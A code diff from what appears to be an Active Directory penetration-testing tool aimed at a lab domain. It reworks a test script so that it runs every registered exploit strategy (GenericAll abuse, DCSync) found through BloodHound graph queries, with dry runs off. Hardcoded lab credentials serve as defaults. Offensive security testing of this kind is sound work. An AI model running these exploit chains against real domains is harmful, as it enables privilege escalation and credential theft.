@@ -1,4 +1,5 @@
 # main.py
+
 import os
 import sys
 from dotenv import load_dotenv
@@ -35,7 +36,7 @@ from references.privilege_levels import classify, PrivilegeLevel
 
 load_dotenv()
 
-def _run_strategy(strategy, edge, creds: dict) -> None:
+def _run_strategy(strategy, edge, creds: dict) -> None: # TODO: If seems interesting, add it as utils...
     """Lance une stratégie et affiche le résultat de façon uniforme."""
     print_check(f"Attacker : {edge.start.label}  ({edge.start.kind.value})")
     print_check(f"Target   : {edge.target.label}  ({edge.target.kind.value})")
@@ -191,100 +192,115 @@ if not path_found:
 
 print_done("All checks complete.")
 
-# ─── 8. Find & exploit a GenericAll edge ───────────────────────────────────
-print_title("Step 7 — Testing GenericAll exploit")
+# ─── 8. Test ALL strategies on matching edges ─────────────────────────────
+# In your main test file
+from strategies import STRATEGY_REGISTRY
+from services.strategy_runner import run_single_strategy, StrategyTestResult
+from utils.platform import BACKEND
 
-# ── 8a. Détecter le backend ───────────────────────────────────────────────────
+print_title("Step 7 — Testing ALL exploit strategies")
 
 print_check(f"Backend detected: {BACKEND.name}")
+
 if BACKEND.name == "none":
-    print_error("No backend available. Install bloodyAD (Linux) or bloodyAD in WSL (Windows).")
-    print_warning("Skipping exploit test.")
+    print_error(
+        "No backend available. Install bloodyAD (Linux) "
+        "or bloodyAD in WSL (Windows)."
+    )
+    print_warning("Skipping all exploit tests.")
 else:
-    # ── 8b. Chercher un edge GenericAll dans Neo4j ──────────────────────────
+    creds = {
+        "dc_ip":    os.getenv("DC_IP",       "192.168.56.10"),
+        "domain":   os.getenv("AD_DOMAIN",   "sevenkingdoms.local"),
+        "username": os.getenv("AD_USERNAME",  "cersei"),
+        "password": os.getenv("AD_PASSWORD",  "cersei"),
+    }
 
-    ga_result = bh.bh_post("/api/v2/graphs/cypher", { # GenericWrite
-        "query": """
-            MATCH (src)-[r:GenericAll]->(dst)
-            WHERE src.enabled = true
-            RETURN src, r, dst
-            LIMIT 1
-        """,
-        "include_properties": True
-    })
+    all_results: list[StrategyTestResult] = []
 
-    ga_nodes = ga_result.get("data", {}).get("nodes", {}) if ga_result else {}
-    # node : label, kind, kinds, objectId, isTierZero, isOwnedObject
-    # print(ga_nodes)
-    ga_edges = ga_result.get("data", {}).get("edges", []) if ga_result else []
+    for strategy_cls, relationship, src_label, dst_label in STRATEGY_REGISTRY:
+        print_title(f"Testing: {strategy_cls.__name__}  (edge: {relationship})")
 
-    if not ga_edges:
-        print_warning("No GenericAll edge found in the graph.") # /GenericWrite
-    elif not ga_nodes:
-        print_warning("No GenericAll nodes found in the graph.") # /GenericWrite
-    else:
-        nodes = parse_dict_node(n=ga_nodes)
-        edge = parse_list_edge(e=ga_edges, nodes=nodes)[0]
+        entries = run_single_strategy(
+            bh=bh,
+            strategy_cls=strategy_cls,
+            relationship=relationship,
+            creds=creds,
+            src_label=src_label,
+            dst_label=dst_label,
+            limit=3,
+            dry_run=False,
+        )
 
-        src_node = edge.start
-        dst_node = edge.target
-        print_check(f"Found edge: {edge.kind.value} — {src_node} → {dst_node}")
-        print_check(f"Attacker : {src_node.label}  ({src_node.kind.value})")
-        print_check(f"Target   : {dst_node.label}  ({dst_node.kind.value})")
+        for entry in entries:
+            all_results.append(entry)
 
-        strategy = GenericAllStrategy(edge=edge)
-        print_check(f"can_exploit() → {strategy.can_exploit()}")
+            if entry.skipped:
+                print_warning(f"  SKIP — {entry.skip_reason}")
+                continue
 
-        creds = {
-            "dc_ip":    os.getenv("DC_IP",       "192.168.56.10"),
-            "domain":   os.getenv("AD_DOMAIN",   "sevenkingdoms.local"),
-            "username": os.getenv("AD_USERNAME", "cersei"),
-            "password": os.getenv("AD_PASSWORD", "cersei"),
-            # "hashes": os.getenv("AD_HASHES"),  # LM:NT si PTH
-        }
+            edge = entry.edge
+            src = edge.source_node.label if edge else "?"
+            dst = edge.goal_node.label   if edge else "?"
 
-        print_check(f"Launching exploit — {edge.kind.value}")
+            if entry.error:
+                print_error(f"  FAIL — {src} → {dst}")
+                print_error(f"         {entry.error}")
+                continue
 
-        result = strategy.exploit(creds)
-        try:
-            if result.was_executed():
-                print_done(f"Exploit succeeded! Technique: {result.technique}")
-                print_check(f"Output:\n{result.summary()}")
-                result.print_next_steps()
-            elif result.is_dry_run():
-                print_warning(f"Exploit returned success=None:\n{result.output}")
+            res = entry.result
+            if res and res.success:
+                print_done(f"  OK   — {src} → {dst}  [{res.technique}]")
+                if res.notes:
+                    for line in res.notes.splitlines():
+                        print_check(f"         {line}")
+                if hasattr(res, "print_next_steps"):
+                    res.print_next_steps()
+            elif res and res.success is None:
+                print_warning(f"  DRY  — {src} → {dst}  (success=None)")
             else:
-                print_warning(f"Exploit returned success=False:\n{result.output}")
-        except HopFailedError as e:
-            print_error(f"HopFailedError: {e}")
+                print_warning(f"  FAIL — {src} → {dst}  (success=False)")
 
-# ─── 9. DCSync ──────────────────────────────────────────────────────────────
-print_title("Step 8 — Testing DCSync exploit")
+    # ── Summary ──────────────────────────────────────────────────────────
+    print_title("Summary")
 
-dc_result = bh.bh_post("/api/v2/graphs/cypher", {
-    "query": """
-        MATCH (src)-[r:DCSync|GetChangesAll]->(dst:Domain)
-        WHERE src.enabled = true
-        RETURN src, r, dst
-        LIMIT 1
-    """,
-    "include_properties": True
-})
+    total    = len(all_results)
+    passed   = sum(1 for r in all_results if r.success)
+    failed   = sum(1 for r in all_results if r.error)
+    skipped  = sum(1 for r in all_results if r.skipped)
 
-dc_nodes = dc_result.get("data", {}).get("nodes", {}) if dc_result else {}
-dc_edges = dc_result.get("data", {}).get("edges", []) if dc_result else []
+    print_check(f"Total:   {total}")
+    print_done( f"Passed:  {passed}")
+    if failed:
+        print_error(f"Failed:  {failed}")
+    if skipped:
+        print_warning(f"Skipped: {skipped}")
 
-if not dc_edges or not dc_nodes:
-    print_warning("No DCSync / GetChangesAll edge found in the graph.")
-else:
-    nodes  = parse_dict_node(n=dc_nodes)
-    edge   = parse_list_edge(e=dc_edges, nodes=nodes)[0]
+    print()
+    header = f"{'Strategy':<35} {'Edge':<20} {'Source → Target':<45} {'Result':<10}"
+    print(header)
+    print("─" * len(header))
 
-    strategy = DCSyncStrategy(edge=edge)
-    print_check(f"Found edge: {edge.kind.value} — {edge.start.label} → {edge.target.label}")
-    print_check(f"can_exploit() → {strategy.can_exploit()}")
+    for r in all_results:
+        name  = r.strategy_name[:34]
+        rel   = r.relationship[:19]
 
-    _run_strategy(strategy, edge, CREDS)
+        if r.edge:
+            pair = f"{r.edge.source_node.label} → {r.edge.goal_node.label}"
+        else:
+            pair = "—"
+        pair = pair[:44]
+
+        if r.skipped:
+            status = "SKIP"
+        elif r.error:
+            status = "FAIL"
+        elif r.success:
+            status = "OK"
+        else:
+            status = "FAIL"
+
+        print(f"{name:<35} {rel:<20} {pair:<45} {status:<10}")
 
 # ─── 10. High-value targets ───────────────────────────────────────────────────
 # We need : a reference table or lookup catalog
